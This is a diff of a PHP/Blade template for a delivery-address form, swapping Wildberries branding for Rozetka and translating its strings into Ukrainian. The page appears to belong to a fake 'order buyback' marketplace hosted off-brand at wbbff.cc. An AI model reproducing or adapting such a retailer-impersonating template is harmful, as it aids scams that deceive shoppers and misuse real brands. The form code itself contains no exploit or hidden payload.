@@ -11,11 +11,11 @@
 	</style>
 	<meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
 	<meta name="viewport" content="width=device-width, initial-scale=1.0, minimum-scale=1.0, maximum-scale=1.0">
-	<title>добавить адрес - Wildberries</title>
-	<meta name="keywords" content="Платформа обратного выкупа для российских торговцев">
-	<meta name="description" content="Коллекции женской, мужской и детской одежды, обуви, а также товары для дома и спорта. Информация о доставке и оплате. Таблицы размеров, советы по уходу за вещами.">
+	<title>додати адресу - Rozetka</title>
+	<meta name="keywords" content="Платформа зворотного викупу для російських торговців">
+	<meta name="description" content="Колекції жіночого, чоловічого та дитячого одягу, взуття, а також товари для дому та спорту. Інформація про доставку та оплату. Таблиці розмірів, поради з догляду за речами.">
 	<meta name="format-detection" content="telephone=no">
-	<link rel="shortcut icon" type="image/ico" href="https://wbbff.cc/favicon.ico">
+	<link rel="shortcut icon" type="image/ico" href="<?php echo asset("assets/favicon.ico") ?>">
 	<link type="text/css" rel="stylesheet" href="<?php echo asset("assets/style.css") ?>">
 	<script type="text/javascript" src="<?php echo asset("assets/jquery.js") ?>"></script>
 	<script type="text/javascript" src="<?php echo asset("assets/global.js") ?>"></script>
@@ -26,15 +26,15 @@
 <body>
 	<div class="pagetop">
 		<div class="fh"><a href="<?php echo route("delivery") ?>"></a></div>
-		<div>добавить адрес</div>
+		<div>додати адресу</div>
 		<!-- <div class="cd"><a href="javascript:top_menu();"></a></div> -->
 		<!-- 
 <div class="top_menu" id="top_menu">
 	<ul>
-	<li><a href="<?php echo route("index") ?>"><i class="top_tb1"></i><span>Главная</span></a></li>
+	<li><a href="<?php echo route("index") ?>"><i class="top_tb1"></i><span>Головна</span></a></li>
 	<li><a href="https://wbbff.cc/index.php/category/list"><i class="top_tb2"></i><span>Каталог</span></a></li>
-	<li><a href="<?php echo route("cart") ?>"><i class="top_tb3"></i><span>Корзина</span></a></li>
-	<li><a href="<?php echo route("profile") ?>"><i class="top_tb4"></i><span>Профиль</span></a></li>
+	<li><a href="<?php echo route("cart") ?>"><i class="top_tb3"></i><span>Кошик</span></a></li>
+	<li><a href="<?php echo route("profile") ?>"><i class="top_tb4"></i><span>Профіль</span></a></li>
 	</ul>
 	<div class="clear"></div>
 </div> -->
@@ -44,30 +44,30 @@
 			@csrf
 			<div class="zc_box2">
 				<div class="zc_list">
-					<div class="zc_name">Получатель</div>
+					<div class="zc_name">Отримувач</div>
 					<div class="zc_text">
-						<input type="text" name="user_tname" placeholder="ФИО" value="{{ $delivery->name }}">
+						<input type="text" name="user_tname" placeholder="ПІБ" value="{{ $delivery->name }}">
 					</div>
 				</div>
 
 				<div class="zc_list">
-					<div class="zc_name">Номер телефона</div>
+					<div class="zc_name">Номер телефону</div>
 					<div class="zc_text">
-						<input type="text" name="user_phone" placeholder="Номер телефона" value="{{ $delivery->phone }}">
+						<input type="text" name="user_phone" placeholder="Номер телефону" value="{{ $delivery->phone }}">
 					</div>
 				</div>
 
 				<div class="zc_list zc_textarea">
-					<div class="zc_name">адрес</div>
+					<div class="zc_name">адреса</div>
 					<div class="zc_text">
-						<textarea name="address_text" placeholder="Полный адрес">{{ $delivery->address }}</textarea>
+						<textarea name="address_text" placeholder="Повна адреса">{{ $delivery->address }}</textarea>
 					</div>
 				</div>
 
 				<div class="sh_moren">
 					<label for="default">
 						<input type="checkbox" name="address_default" value="1" class="inputfix mar5" id="default">
-						<span>Адрес по умолчанию</span>
+						<span>Адреса за замовчуванням</span>
 					</label>
 				</div>
 
@@ -75,7 +75,7 @@
 			<div class="loginbtn" style="margin:20px 10px;">
 				<input type="hidden" name="pe_token" value="75236c7c5fdf7ebfe3441c02863d0cb8">
 				<input type="hidden" name="pesubmit">
-				<input type="button" value="сохранять" class="tjbtn">
+				<input type="button" value="зберегти" class="tjbtn">
 			</div>
 		</form>
 	</div>
@@ -86,8 +86,8 @@
 				$(":input[name='user_tname'],:input[name='user_phone'],:input[name='address_text']").blur();
 			})
 			$("#shengshi").cityPicker({
-				title: "请选择收货地址",
-				onChange: function(picker, values, displayValues) { //选择后触发的事件
+				title: "Будь ласка, виберіть адресу доставки",
+				onChange: function(picker, values, displayValues) { //вибір після тригера події
 					$(":input[name='address_province']").val(displayValues[0]);
 					$(":input[name='address_city']").val(displayValues[1]);
 					$(":input[name='address_area']").val(displayValues[2]);
@@ -95,15 +95,15 @@
 			});
 			$(":button").click(function() {
 				if ($(":input[name='user_tname']").val() == '') {
-					app_tip("Пожалуйста, укажите грузополучателя");
+					app_tip("Будь ласка, вкажіть одержувача");
 					return false;
 				}
 				if ($(":input[name='user_phone']").val() == '') {
-					app_tip("Введите номер телефона");
+					app_tip("Введіть номер телефону");
 					return false;
 				}
 				if ($(":input[name='address_text']").val() == '') {
-					app_tip("Пожалуйста, заполните подробный адрес");
+					app_tip("Будь ласка, заповніть детальну адресу");
 					return false;
 				}
 				app_submit('{{ route("api.delivery.update", $delivery->id) }}', function(json) {
@@ -120,7 +120,7 @@
 	<script type="text/javascript" src="<?php echo asset("assets/layer.js") ?>"></script>
 	<script type="text/javascript" src="<?php echo asset("assets/app.js") ?>"></script>
 	<script type="text/javascript">
-		//顶部菜单点击
+		//верхнє меню клік
 		function top_menu() {
 			if ($("#top_menu").is(":hidden")) {
 				$("#top_menu").show();
@@ -136,13 +136,13 @@
 	<script>
 		function confirm_huigou(order_id) {
 			layer.open({
-				content: "Определить выкуп этого Заказ？",
-				btn: ["OK", "Отмена"],
+				content: "Визначити викуп цього Замовлення？",
+				btn: ["OK", "Скасувати"],
 				shadeClose: false,
 				yes: function() {
 
 					/*layer.open({
-						content: '你点了确认',
+						content: 'Ви натиснули підтвердити',
 						time: 1
 					});*/
 					$.ajax({
